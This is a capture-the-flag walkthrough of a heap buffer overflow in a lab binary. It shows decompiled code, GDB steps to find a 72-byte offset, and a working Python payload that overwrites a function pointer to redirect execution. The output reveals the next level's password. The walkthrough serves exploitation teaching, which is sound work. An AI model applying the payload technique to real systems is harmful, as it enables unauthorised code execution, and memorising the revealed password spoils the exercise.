# Level 6: Heap Buffer Overflow and Function Pointer Hijacking

## Challenge Overview

Level 6 involves exploiting a heap buffer overflow vulnerability to retrieve the password for the next level.

## Source Code

Using Ghidra, we get a source code of the binary that looks like this:

```c
void n(void)
{
  system("/bin/cat /home/user/level7/.pass");
  return;
}

void m(void *param_1, int param_2, char *param_3, int param_4, int param_5)
{
  puts("Nope");
  return;
}

int main(int argc, char **argv)
{
  char *buffer;
  void (**function_ptr)(void);

  buffer = (char *)malloc(64);
  function_ptr = malloc(4);
  *function_ptr = m;
  strcpy(buffer, argv[1]);
  (*function_ptr)();
  return 0;
}
```

## Source Code Analysis

Looking at the source code, we can identify a heap buffer overflow vulnerability:

1. The program allocates a 64-byte buffer on the heap with `malloc()`
2. It then allocates a 4-byte function pointer on the heap and sets it to point to `m()`
3. It copies user input into the buffer using `strcpy()` without size checking
4. Finally, it calls the function pointed to by the function pointer

Since `strcpy()` doesn't perform bounds checking, we can overflow the buffer and potentially overwrite the function pointer. If we can replace the address of `m()` with the address of `n()`, we can get the program to print the password for level7.

## Vulnerability

The vulnerability lies in the use of `strcpy()` to copy user input into a heap-allocated buffer without checking the size of the input. This allows an attacker to overflow the buffer and overwrite adjacent memory, including the function pointer.

## Exploitation Steps

1. Determine the address of the `n()` function

   ```
   (gdb) disas n
   ```

2. Determine how much padding is needed to reach the function pointer

   - We know the buffer is 64 bytes
   - But since both are allocated with malloc, we need to determine the exact offset. That is because malloc adds metadata to each allocation (like size information and alignment padding), creating additional space between consecutive allocations on the heap.

3. Create an exploit string with padding + `n` address

   ```bash
   ./level6 $(python -c 'print "A"*[OFFSET] + "\x[n_ADDR]"')
   ```

4. Run the exploit and obtain the password

## Getting the Password

First, let's find the address of the `n()` function:

```
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   ...
```

The address of `n` is 0x08048454.

Next, we need to determine the exact offset between the buffer and the function pointer. We can find this using GDB by examining the memory addresses from the malloc calls:

```bash
(gdb) disas main
    0x0804848c <+16>:    call   0x8048350 <malloc@plt>
    0x08048491 <+21>:    mov    %eax,0x1c(%esp)
    ...
    0x0804849c <+32>:    call   0x8048350 <malloc@plt>
    0x080484a1 <+37>:    mov    %eax,0x18(%esp)
```

```
(gdb) break main
(gdb) run test
(gdb) break *0x08048491  # Break after first malloc. The '*' indicates that we want to break at the address of the instruction.
(gdb) cont               # Runs the program until it hits the breakpoint
(gdb) x $eax             # Show address returned by first malloc (buffer)
0x804a008:      0x00000000
(gdb) break *0x080484a1  # Break after second malloc
(gdb) cont
(gdb) x $eax             # Show address returned by second malloc (function pointer)
0x804a050:      0x00000000
```

Calculating the difference: 0x804a050 - 0x804a008 = 0x48 (72 in decimal)

So we can confirm that an offset of 72 bytes is needed to reach and overwrite the function pointer:

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

This command will execute the program with our crafted input, causing it to call `n()` which will display the contents of `/home/user/level7/.pass`.

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
